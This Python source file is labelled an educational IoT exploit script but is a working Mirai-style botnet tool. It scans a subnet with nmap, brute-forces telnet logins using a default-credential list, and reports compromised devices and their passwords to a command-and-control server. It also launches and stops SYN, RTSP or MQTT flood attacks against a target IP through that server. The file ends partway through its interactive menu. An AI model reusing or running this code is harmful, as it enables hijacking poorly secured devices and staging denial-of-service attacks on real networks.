#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
import platform
import sys
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from credentials import get_credentials, get_device_specific_credentials

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"
          # Load credentials from external file
        try:
            self.credentials = get_credentials()
            self.log(f"Loaded {len(self.credentials)} credential pairs from credentials.py")
        except ImportError:
            self.log("Warning: Could not import credentials.py, using fallback credentials")
            # Minimal fallback credentials if file is not available
            self.credentials = [
                ("ipcamadmin", "admin"),      # Digital IPCam credentials
                ("temphumidadmin", "admin"),  # Digital TempHumidSensor credentials
                ("admin", "admin"),
                ("root", "root"), 
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "admin"),
                ("pi", "raspberry"),
                ("ubuntu", "ubuntu")
            ]
        
        self.compromised_devices = []
        self.scan_results = []
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                self.log(f"Nmap ping scan failed: {result.stderr}")
                return []
                
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    # Extract IP from line like "Nmap scan report for 192.168.1.1"
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[-1].strip('()')
                        active_hosts.append(ip)
                        
            if not active_hosts:
                self.log("No active hosts found")
                return []
                
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            
            for host in active_hosts:
                try:
                    self.log(f"Scanning ports on {host}")
                    result = subprocess.run([
                        "nmap", "-p", target_ports, "-sV", "--open", host
                    ], capture_output=True, text=True, timeout=120)
                    
                    if result.returncode != 0:
                        self.log(f"Port scan failed for {host}: {result.stderr}")
                        continue
                        
                    output = result.stdout
                    current_ip = host
                    
                    for line in output.splitlines():
                        # Example: 23/tcp   open  telnet
                        if "/tcp" in line and "open" in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                port_info = parts[0].split("/")[0]
                                try:
                                    port = int(port_info)
                                    service = parts[2] if len(parts) > 2 else "unknown"
                                    self.log(f"Found open port {port} ({service}) on {current_ip}")
                                    vulnerable_hosts.append({
                                        'ip': current_ip,
                                        'port': port,
                                        'service': service
                                    })
                                except ValueError:
                                    continue
                                    
                except subprocess.TimeoutExpired:
                    self.log(f"Timeout scanning {host}")
                    continue
                except Exception as e:
                    self.log(f"Error scanning {host}: {e}")
                    continue
            
            # Update local scan results
            self.scan_results = vulnerable_hosts
            self.log(f"Scan complete. Found {len(self.scan_results)} potentially vulnerable devices")
            
            # Send each scan result to C&C server
            successful_submits = 0
            for device in self.scan_results:
                try:
                    self.log(f"Sending scan result for {device['ip']}:{device['port']} ({device['service']}) to C&C server")
                    
                    response = requests.post(
                        f"{self.cnc_url}/add-scan-result",
                        json={
                            'ip': device['ip'],
                            'port': device['port'],
                            'service': device['service']
                        },
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        self.log(f"[SUCCESS] Successfully sent scan result for {device['ip']} to C&C server")
                        successful_submits += 1
                    else:
                        self.log(f"[FAIL] Failed to send scan result for {device['ip']} to C&C server. Status: {response.status_code}")
                        
                except Exception as e:
                    self.log(f"[FAIL] Error sending scan result for {device['ip']}: {e}")

            self.log(f"Successfully submitted {successful_submits}/{len(self.scan_results)} scan results to C&C server")
            return self.scan_results
            
        except subprocess.TimeoutExpired:
            self.log("Network scan timed out")
            return []
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt telnet login with given credentials"""
        try:
            self.log(f"Attempting telnet connection to {host}:{port} with '{username}':'{password}'")
            tn = telnetlib.Telnet(host, port, timeout=15)
            
            # Wait for login prompt with multiple possible patterns
            login_patterns = [
                b"login: ", b"Login: ", b"Username: ", b"username: ",
                b"user: ", b"User: ", b"Account: ", b"account: "
            ]
            try:
                index, match, response = tn.expect(login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                self.log(f"Login prompt response: {response_text.strip()}")
                
                if not match:
                    # Try sending a newline to trigger login prompt
                    tn.write(b"\n")
                    index, match, response = tn.expect(login_patterns, timeout=5)
                    response_text = response.decode(errors='ignore')
                    
                    if not match:
                        self.log(f"[FAIL] No login prompt found for {host}")
                        tn.close()
                        return False
            except Exception as e:
                self.log(f"[FAIL] Exception waiting for login prompt on {host}: {e}")
                tn.close()
                return False
            
            # Send username
            tn.write(username.encode() + b"\n")
            self.log(f"Sent username: '{username}' to {host}")
            
            # Wait for password prompt
            password_patterns = [
                b"Password: ", b"password: ", b"Password:", b"password:",
                b"passcode: ", b"Passcode: ", b"Password for", b"password for"
            ]
            try:
                index, match, response = tn.expect(password_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                self.log(f"Password prompt response: {response_text.strip()}")
                
                if not match:
                    self.log(f"[FAIL] No password prompt found for {host}")
                    tn.close()
                    return False
            except Exception as e:
                self.log(f"[FAIL] Exception waiting for password prompt on {host}: {e}")
                tn.close()
                return False
            
            # Send password
            password_to_send = password if password else ""
            tn.write(password_to_send.encode() + b"\n")
            self.log(f"Sent password: '{password_to_send}' to {host}")            # Check for successful login by looking for shell prompts or failure messages
            # More specific shell prompt patterns to avoid false positives
            shell_patterns = [
                b":~$ ", b":~# ", b":/$ ", b":/# ",  # Linux-style prompts with paths
                b"$ ", b"# ",  # Basic shell prompts (but only with space after)
                b"admin@", b"root@", b"user@", b"ipcamadmin@", b"temphumidadmin@",  # Specific user prompts
                b"menu>", b"Main Menu", b"BusyBox",  # Device-specific prompts
                b"~$ ", b"~# ", b"~]$ ", b"~]# "  # Additional common shell patterns
            ]
            
            failure_patterns = [
                b"incorrect", b"failed", b"invalid", b"denied", 
                b"Login incorrect", b"Access denied", b"Authentication failed",
                b"wrong", b"error", b"failure", b"not recognized",                b"login failed", b"access denied", b"authentication failed",
                b"permission denied", b"login attempt failed"
            ]
            
            all_patterns = shell_patterns + failure_patterns
            
            try:
                index, match, response = tn.expect(all_patterns, timeout=20)
                response_text = response.decode(errors='ignore')
                  # Enhanced debugging - show the exact response
                self.log(f"Login response (raw): {repr(response)}")
                self.log(f"Login response (text): {response_text.strip()}")
                self.log(f"Pattern matched index: {index}, match: {match}")
                
                # FIRST: Check if we matched a shell pattern (success takes priority)
                if match and index < len(shell_patterns):
                    self.log(f"[DEBUG] Shell pattern matched at index {index}")
                    
                    # Look for more specific shell prompt indicators
                    if (b"@" in response and (b":~" in response or b":/" in response or b"~" in response)) or \
                       (username.encode() in response and b"@" in response) or \
                       any(prompt in response for prompt in [b"ipcamadmin@", b"temphumidadmin@", b"admin@", b"root@"]):
                        # This looks like a real shell prompt with username@hostname format
                        self.log(f"[SUCCESS] Detected shell prompt with user@host format for {host}")
                        
                        # Verify with a simple echo command
                        tn.write(b"echo SHELL_TEST_SUCCESS\n")
                        try:
                            echo_response = tn.read_until(b"SHELL_TEST_SUCCESS", timeout=5)
                            if b"SHELL_TEST_SUCCESS" in echo_response:
                                self.log(f"[SUCCESS] Shell access confirmed for {host} with '{username}':'{password}'")
                                tn.close()
                                return True
                        except:
                            pass
                        
                        # Even if echo fails, if we have proper shell prompt format, consider it success
                        self.log(f"[SUCCESS] Shell prompt detected for {host} with '{username}':'{password}'")
                        tn.close()
                        return True
                    else:
                        # Generic prompt match - need better verification
                        self.log(f"? Generic shell prompt detected for {host}, attempting verification...")
                        
                        # Try verification commands
                        verification_commands = [
                            b"whoami\n",
                            b"pwd\n", 
                            b"echo test\n"
                        ]
                        
                        for cmd in verification_commands:
                            tn.write(cmd)
                            try:
                                ver_response = tn.read_until(b"\n", timeout=3)
                                ver_text = ver_response.decode(errors='ignore')
                                
                                # Look for actual command output
                                if any(indicator in ver_text.lower() for indicator in ['root', 'admin', 'user', '/', 'test']):
                                    self.log(f"[SUCCESS] Command verification successful for {host} with '{username}':'{password}'")
                                    tn.close()
                                    return True
                            except:
                                continue
                        
                        # If verification failed, this might be a false positive
                        self.log(f"[FAIL] Could not verify shell access for {host} with '{username}':'{password}'")
                        tn.close()
                        return False                # SECOND: Only check for failure messages if we didn't match a shell pattern
                elif any(failure.decode().lower() in response_text.lower() for failure in failure_patterns):
                    # Be more specific about failure detection - avoid false positives from system messages
                    failure_indicators = ['login incorrect', 'authentication failed', 'access denied', 'permission denied']
                    if any(fail_msg in response_text.lower() for fail_msg in failure_indicators):
                        self.log(f"[FAIL] Login rejected for {host} with '{username}':'{password}' - specific failure message detected")
                        tn.close()
                        return False
                    else:
                        self.log(f"[DEBUG] Generic failure keyword detected but not a specific login failure message - continuing...")                # THIRD: No pattern matched - try to read any remaining response and see what we got
                else:
                    self.log(f"[DEBUG] No pattern matched, trying to read remaining response...")
                    try:
                        # Give it a moment and try to read more
                        time.sleep(2)
                        remaining = tn.read_very_eager()
                        if remaining:
                            remaining_text = remaining.decode(errors='ignore')
                            self.log(f"[DEBUG] Additional response: {repr(remaining)}")
                            self.log(f"[DEBUG] Additional response text: {remaining_text}")
                              # Check if it looks like a shell prompt in the additional response
                            if any(indicator in remaining for indicator in [b"$", b"#", b"@", b"~"]):
                                self.log(f"[SUCCESS] Shell indicators found in delayed response for {host} with '{username}':'{password}'")
                                tn.close()
                                return True
                    except:
                        pass
                    
                    self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - no shell prompt detected")
                    tn.close()
                    return False
                    
            except Exception as e:
                self.log(f"[FAIL] Exception checking login result on {host}: {e}")
                tn.close()
                return False
                
        except Exception as e:
            self.log(f"[FAIL] Telnet connection failed for {host}: {e}")
            return False

    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server with enhanced retry logic and error handling"""
        try:
            # Validate inputs
            if not ip or not isinstance(ip, str):
                self.log(f"[FAIL] Invalid IP address: {ip}")
                return False
                
            # Enhanced IP format validation
            import re
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
                self.log(f"[FAIL] Invalid IP format: {ip}")
                return False
                
            payload = {
                'ip': ip,
                'username': username or "",  # Handle None values
                'password': password or "",  # Handle None values
                'status': 'online',
                'device_type': self._detect_device_type(ip),
                'timestamp': datetime.now().isoformat()
            }
            
            self.log(f"Sending registration request for {ip} with '{username}':'{password}' to C&C server")
            
            # Retry logic with escalating timeouts
            max_retries = 3
            timeouts = [20, 45, 60]  # Progressive timeout increase
            last_error = None
            
            for attempt in range(max_retries):
                try:
                    self.log(f"Registration attempt {attempt + 1}/{max_retries} for {ip} (timeout: {timeouts[attempt]}s)")
                    
                    response = requests.post(
                        f"{self.cnc_url}/bot-checkin",
                        json=payload,
                        timeout=timeouts[attempt]
                    )
                    
                    # Successful response
                    if response.status_code == 200:
                        try:
                            response_data = response.json()
                            self.log(f"[SUCCESS] C2 registration successful for {ip}: {response_data}")
                        except json.JSONDecodeError:
                            self.log(f"[SUCCESS] C2 registration successful for {ip} (non-JSON response)")
                            
                        self.log(f"[SUCCESS] Successfully registered compromised device {ip} with '{username}':'{password}'")
                        
                        # Update local list with successful registration
                        device_info = {
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'status': 'online',
                            'registered_c2': True,
                            'device_type': payload['device_type'],
                            'timestamp': datetime.now().isoformat(),
                            'registration_attempts': attempt + 1
                        }
                        
                        # Remove any existing entry for this IP
                        self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
                        # Add the new entry
                        self.compromised_devices.append(device_info)
                        return True
                        
                    else:
                        error_msg = f"C2 server returned HTTP {response.status_code}"
                        try:
                            error_detail = response.text[:200]  # Limit error text
                            error_msg += f": {error_detail}"
                        except:
                            pass
                        last_error = error_msg
                        self.log(f"[FAIL] Registration attempt {attempt + 1} failed for {ip}: {error_msg}")
                        
                        if attempt < max_retries - 1:
                            time.sleep(2)  # Brief delay between retries
                        continue
                        
                except requests.exceptions.Timeout:
                    error_msg = f"Timeout after {timeouts[attempt]}s"
                    last_error = error_msg
                    self.log(f"[FAIL] Registration attempt {attempt + 1} timed out for {ip}")
                    
                    if attempt < max_retries - 1:
                        time.sleep(2)
                    continue
                    
                except requests.exceptions.ConnectionError as e:
                    error_msg = f"Connection error: {str(e)[:100]}"
                    last_error = error_msg
                    self.log(f"[FAIL] Connection error on attempt {attempt + 1} for {ip}: {error_msg}")
                    
                    if attempt < max_retries - 1:
                        time.sleep(3)  # Longer delay for connection errors
                    continue
                    
                except requests.exceptions.RequestException as e:
                    error_msg = f"Request error: {str(e)[:100]}"
                    last_error = error_msg
                    self.log(f"[FAIL] Request error on attempt {attempt + 1} for {ip}: {error_msg}")
                    
                    if attempt < max_retries - 1:
                        time.sleep(2)
                    continue
                    
                except Exception as e:
                    error_msg = f"Unexpected error: {str(e)[:100]}"
                    last_error = error_msg
                    self.log(f"[FAIL] Unexpected error on attempt {attempt + 1} for {ip}: {error_msg}")
                    
                    if attempt < max_retries - 1:
                        time.sleep(2)
                    continue
            
            # All retry attempts failed
            self.log(f"[FAIL] All {max_retries} registration attempts failed for {ip}. Last error: {last_error}")
            
            # Add to local list with failure details
            device_info = {
                'ip': ip,
                'username': username,
                'password': password,
                'status': 'error',
                'registered_c2': False,
                'device_type': payload['device_type'],
                'error': last_error,
                'registration_attempts': max_retries,
                'timestamp': datetime.now().isoformat()
            }
            
            # Remove any existing entry for this IP
            self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
            self.compromised_devices.append(device_info)
            return False

        except Exception as e:
            error_msg = f"Critical error in registration process: {str(e)}"
            self.log(f"[FAIL] {error_msg}")
            
            # Still add to local list even if registration fails with exception
            device_info = {
                'ip': ip,
                'username': username,
                'password': password,
                'status': 'error',
                'registered_c2': False,
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
            self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
            self.compromised_devices.append(device_info)
            return False
    
    def _detect_device_type(self, ip):
        """Try to detect device type based on open ports and banners"""
        try:
            # First check if we already have scan results for this IP
            device_services = [result for result in self.scan_results if result['ip'] == ip]
            
            if device_services:
                service_names = [s['service'].lower() for s in device_services]
                
                if any('cam' in s for s in service_names) or any('rtsp' in s for s in service_names):
                    return 'camera'
                elif any('router' in s for s in service_names) or any('gateway' in s for s in service_names):
                    return 'router'
                elif any('dvr' in s for s in service_names) or any('nvr' in s for s in service_names):
                    return 'dvr'
                    
            # If we couldn't determine from services, try a banner grab
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 23))
                banner = s.recv(1024)
                s.close()
                
                banner_text = banner.decode(errors='ignore').lower()
                
                if 'dvr' in banner_text or 'nvr' in banner_text:
                    return 'dvr'
                elif 'camera' in banner_text or 'ipcam' in banner_text:
                    return 'camera'
                elif 'router' in banner_text or 'gateway' in banner_text:
                    return 'router'
                elif 'iot' in banner_text:
                    return 'iot'
            except:
                pass
                
            # Default if we can't determine
            return 'unknown'
            
        except Exception:
            return 'unknown'
    
    def save_results(self, prefix="results"):
        """Save scan and exploitation results with custom prefix"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Add timestamp to filenames
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Save scan results
            scan_file = f"results/{prefix}_scan_{timestamp}.json"
            with open(scan_file, 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            devices_file = f"results/{prefix}_devices_{timestamp}.json"
            with open(devices_file, 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log(f"Results saved to {scan_file} and {devices_file}")
            
            # Also save a CSV of compromised devices for easy importing
            csv_file = f"results/{prefix}_devices_{timestamp}.csv"
            with open(csv_file, 'w') as f:
                f.write("IP,Username,Password,Status,RegisteredWithC2\n")
                for device in self.compromised_devices:
                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
            
            self.log(f"CSV export saved to {csv_file}")
            
            return True
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
            return False

    def start_ddos_via_c2(self):
        """Initiate Telnet-based DDoS attack via C2 server API"""
        if not self.compromised_devices:
            print("No compromised devices available. Please run brute-force first.")
            return

        print("\nStarting Telnet-based DDoS attack via C2 server...")
        target_ip = input("Enter target IP to attack: ").strip()
        
        if not target_ip:
            print("[FAIL] Target IP cannot be empty.")
            return
            
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ").lower().strip()

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            print("[FAIL] Invalid attack type. Please choose syn, rtsp, or mqtt.")
            return

        try:
            print(f"Sending attack request to C2 server...")
            print(f"Target: {target_ip}, Attack Type: {attack_type}")
            print("â³ Connecting to C2 server and initiating attacks...")
            
            # Show progress during the request
            import threading
            import time
            
            def show_progress():
                dots = 0
                while not hasattr(show_progress, 'done'):
                    print(f"\râ³ Processing telnet connections{'.' * (dots % 4):<4}", end='', flush=True)
                    dots += 1
                    time.sleep(0.5)
                print("\r" + " " * 50 + "\r", end='', flush=True)  # Clear progress line
            
            progress_thread = threading.Thread(target=show_progress, daemon=True)
            progress_thread.start()
            
            try:
                response = requests.post(
                    f"{self.cnc_url}/start-telnet-ddos",
                    json={
                        "target": target_ip,
                        "attack_type": attack_type
                    },
                    timeout=120  # Increased timeout for multiple telnet connections
                )
            finally:
                show_progress.done = True
                time.sleep(0.6)  # Allow progress thread to clean up
            
            print(f"Response Status Code: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"C2 server response: {response_data}")
                
                if response_data.get('status') == 'success':
                    successful_ips = response_data.get('successful_ips', [])
                    failed_ips = response_data.get('failed_ips', {})
                    total_devices = response_data.get('total_devices', len(self.compromised_devices))
                    
                    if successful_ips:
                        print(f"[SUCCESS] Successfully started DDoS attack on {len(successful_ips)}/{total_devices} devices")
                        print(f"[SUCCESS] Active attack devices: {', '.join(successful_ips)}")
                        
                        if failed_ips:
                            print(f"âš  Failed devices ({len(failed_ips)}):")
                            for device_ip, error in failed_ips.items():
                                print(f"  â€¢ {device_ip}: {error}")
                    else:
                        print(f"[FAIL] Failed to start DDoS attack on any devices")
                        if failed_ips:
                            print(f"[FAIL] All {total_devices} devices failed to execute the attack")
                            print("Failure details:")
                            for device_ip, error in failed_ips.items():
                                print(f"  â€¢ {device_ip}: {error}")
                        
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    print(f"[FAIL] Attack failed: {error_msg}")
                    
            elif response.status_code == 400:
                error_data = response.json()
                print(f"[FAIL] Bad request: {error_data.get('error', 'Unknown error')}")
                
            else:
                print(f"[FAIL] C2 server returned error {response.status_code}")
                try:
                    error_data = response.json()
                    print(f"[FAIL] Error details: {error_data}")
                except:
                    print(f"[FAIL] Error response: {response.text}")

        except requests.exceptions.Timeout:
            print("[TIMEOUT] C2 server request timed out.")
            print("ğŸ”„ The attack may still be starting in the background.")
            print("ğŸ’¡ You can:")
            print("   1. Check the C2 web interface at http://<C2_IP>:5000")
            print("   2. Wait a few moments and try stopping attacks")
            print("   3. Use 'View attack history' to see if attacks were logged")
            
            # Ask user if they want to continue with other options
            continue_choice = input("\nDo you want to continue with other menu options? (y/n): ").strip().lower()
            if continue_choice != 'y':
                return
        except requests.exceptions.ConnectionError:
            print("[FAIL] Cannot connect to C2 server. Check if the server is running.")
        except Exception as e:
            print(f"[FAIL] Failed to initiate DDoS via C2: {e}")

    def stop_ddos_via_c2(self):
        """Stop Telnet-based DDoS attack via C2 server API"""
        print("\nStopping Telnet-based DDoS attack via C2 server...")
        
        try:
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=60
            )
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"[SUCCESS] C2 server response: {response_data}")
                
                stopped_count = response_data.get('stopped_count', 0)
                print(f"[SUCCESS] Successfully attempted to stop DDoS on {stopped_count} devices")
                
                errors = response_data.get('errors', {})
                if errors:
                    print(f"âš  Errors stopping some devices: {list(errors.keys())}")
            else:
                print(f"[FAIL] C2 server returned error {response.status_code}: {response.text}")

        except requests.exceptions.Timeout:
            print("[FAIL] C2 server request timed out. The stop command may still be processing...")
        except Exception as e:
            print(f"[FAIL] Failed to stop DDoS via C2: {e}")

    def brute_force_telnet(self):
        """Brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            print("[FAIL] No scan results available. Please run a scan first.")
            return
            
        print("\nBrute-forcing Telnet credentials...")
        success_count = 0
        
        # Filter for telnet services
        telnet_targets = [target for target in self.scan_results 
                         if target['service'].lower() == 'telnet' and target['port'] == 23]
        
        if not telnet_targets:
            print("[FAIL] No telnet services found in scan results.")
            return
            
        print(f"Found {len(telnet_targets)} telnet targets to brute force")
        
        for target in telnet_targets:
            target_ip = target['ip']
            self.log(f"Starting brute-force attack on {target_ip}")
            
            success = False
            successful_creds = None
            
            # Try each credential pair
            for i, (username, password) in enumerate(self.credentials):
                self.log(f"Trying credential {i+1}/{len(self.credentials)}: '{username}':'{password}' on {target_ip}")
                
                if self.attempt_telnet_login(target_ip, 23, username, password):
                    self.log(f"[SUCCESS] SUCCESS! {target_ip} compromised with '{username}':'{password}'")
                    successful_creds = (username, password)
                    success = True
                    break
                else:
                    self.log(f"âœ— Failed: '{username}':'{password}' on {target_ip}")
            
            # Register the device if credentials were found
            if success and successful_creds:
                username, password = successful_creds
                self.log(f"Registering {target_ip} with credentials '{username}':'{password}' to C&C server")
                
                if self.register_compromised_device(target_ip, username, password):
                    success_count += 1
                    self.log(f"âœ“ Successfully registered {target_ip} with C&C server")
                else:
                    self.log(f"âœ— Failed to register {target_ip} with C&C server")
            else:
                self.log(f"âœ— Complete brute-force failure for {target_ip} - tried all {len(self.credentials)} credential pairs")
        
        print(f"\nBrute-force completed!")
        if success_count > 0:
            print(f"âœ“ Successfully compromised {success_count}/{len(telnet_targets)} devices")
        else:
            print(f"âœ— Failed to compromise any devices (0/{len(telnet_targets)})")
            print("âœ— Check if credentials are correct or devices are accessible")
        
        self.print_status()

    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=10)
            if response.status_code == 200:
                self.scan_results = response.json()
                self.log(f"Loaded {len(self.scan_results)} scan results from C2 server")
            else:
                self.log(f"Failed to fetch scan results from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching scan results from C2")
        except Exception as e:
            self.log(f"Error fetching scan results: {e}")

    def fetch_compromised_devices_from_c2(self):
        """Fetch compromised devices from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-compromised-devices", timeout=10)
            if response.status_code == 200:
                self.compromised_devices = response.json()
                self.log(f"Loaded {len(self.compromised_devices)} compromised devices from C2")
            else:
                self.log(f"Failed to fetch compromised devices from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching compromised devices from C2")
        except Exception as e:
            self.log(f"Error fetching compromised devices: {e}")

    def print_status(self):
        """Print current status with improved formatting"""
        print("\n" + "="*60)
        print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
        print("â•‘              IoT Exploiter Status                 â•‘")
        print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

        # Print scan results summary
        print("\n[Scan Results]")
        if not self.scan_results:
            print("No scan results available")
        else:
            print(f"Found {len(self.scan_results)} potential targets:")
            
            # Group by service type
            services = {}
            for device in self.scan_results:
                service = device['service'].lower()
                if service not in services:
                    services[service] = []
                services[service].append(device)
            
            # Print summary by service
            for service, devices in services.items():
                print(f"  {service.upper()} ({len(devices)})")
                for device in devices[:5]:  # Only show first 5 of each type
                    print(f"    - {device['ip']}:{device['port']}")
                if len(devices) > 5:
                    print(f"    ... and {len(devices) - 5} more")

        # Print compromised devices with more details
        print("\n[Compromised Devices]")
        if not self.compromised_devices:
            print("No compromised devices available")
        else:
            # Sort devices by IP for consistent display
            sorted_devices = sorted(self.compromised_devices, key=lambda x: x['ip'])
            print(f"Successfully compromised {len(sorted_devices)} devices:")
            
            for i, device in enumerate(sorted_devices, 1):
                # Get status indicator
                if device.get('status') == 'online':
                    status_indicator = "âœ… ONLINE"
                elif device.get('status') == 'offline':
                    status_indicator = "âŒ OFFLINE"
                else:
                    status_indicator = "â“ UNKNOWN"
                    
                # Get C2 registration status
                if device.get('registered_c2'):
                    c2_status = "âœ“ Registered with C2"
                else:
                    c2_status = "âœ— Not registered with C2"
                
                # Print device info
                print(f"  Device #{i}: {device['ip']} - {status_indicator}")
                print(f"    Credentials: {device['username']}:{device['password']}")
                print(f"    C2 Status: {c2_status}")
                
                # Print additional info if available
                if 'device_type' in device and device['device_type'] != 'unknown':
                    print(f"    Type: {device['device_type']}")
                    
                if 'error' in device:
                    print(f"    Error: {device['error']}")
                    
                print()  # Empty line between devices

        # Print connectivity status
        try:
            response = requests.get(f"{self.cnc_url}/", timeout=2)
            if response.status_code == 200:
                print("\n[C2 Server Status]")
                print(f"âœ… Connected to C2 server at {self.cnc_server_ip}")
            else:
                print("\n[C2 Server Status]")
                print(f"âš ï¸ C2 server at {self.cnc_server_ip} returned status code {response.status_code}")
        except Exception:
            print("\n[C2 Server Status]")
            print(f"âŒ Cannot connect to C2 server at {self.cnc_server_ip}")

        print("="*60)

    def explain_registration_status(self):
        """Explain what 'Not registered with C2' means and how to resolve it"""
        print("\n" + "="*80)
        print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
        print("â•‘                      C2 REGISTRATION STATUS EXPLANATION                       â•‘")
        print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
        print()
        print("ğŸ“‹ WHAT DOES 'NOT REGISTERED WITH C2' MEAN?")
        print("   This status indicates that a device was successfully compromised with valid")
        print("   credentials, but the registration with the Command & Control (C2) server failed.")
        print()
        print("ğŸ” COMMON CAUSES:")
        print("   1. C2 Server Not Running:")
        print("      - The C2 server may not be active or reachable")
        print("      - Check if the server is running on the configured port")
        print()
        print("   2. Network Connectivity Issues:")
        print("      - Firewall blocking communication to C2 server")
        print("      - Network routing problems")
        print("      - Wrong C2 server IP address configured")
        print()
        print("   3. Database Issues:")
        print("      - C2 server database may be locked or corrupted")
        print("      - Insufficient disk space for database operations")
        print()
        print("   4. Server Overload:")
        print("      - C2 server may be overwhelmed with requests")
        print("      - Timeout during registration process")
        print()
        print("ğŸ› ï¸  HOW TO RESOLVE:")
        print("   1. Verify C2 Server Status:")
        print("      - Ensure C2 server is running: python run_c2_server.py")
        print("      - Check server logs for errors")
        print()
        print("   2. Test Network Connectivity:")
        print("      - Ping the C2 server IP address")
        print("      - Try accessing the web interface: http://<C2_IP>:5000")
        print()
        print("   3. Check Configuration:")
        print("      - Verify C2 server IP in exploit script settings")
        print("      - Ensure port 5000 is not blocked by firewall")
        print()
        print("   4. Retry Registration:")
        print("      - Use the 'Advanced Options' -> 'Test device connectivity'")
        print("      - Restart the C2 server if needed")
        print("      - Re-run the brute-force attack to re-register devices")
        print()
        print("âœ… SUCCESSFUL REGISTRATION INDICATORS:")
        print("   - Device status shows 'Registered with C2: True'")
        print("   - Device appears in C2 web interface")
        print("   - Device can be used for DDoS attacks via C2")
        print()
        print("âš ï¸  IMPACT OF UNREGISTERED DEVICES:")
        print("   - Cannot participate in coordinated DDoS attacks")
        print("   - Not visible in C2 web dashboard")
        print("   - Cannot receive commands from C2 server")
        print("   - Still compromised with valid credentials (can be manually accessed)")
        print("="*80)

    def interactive_menu(self):
        """Interactive menu for user control with improved UX"""
        while True:
            # Clear screen for better readability
            print("\033[H\033[J") if os.name != 'nt' else os.system('cls')
            
            # Fetch latest data from C2
            try:
                self.fetch_scan_results_from_c2()
                self.fetch_compromised_devices_from_c2()
                c2_connected = True
            except:
                c2_connected = False

            self.print_status()

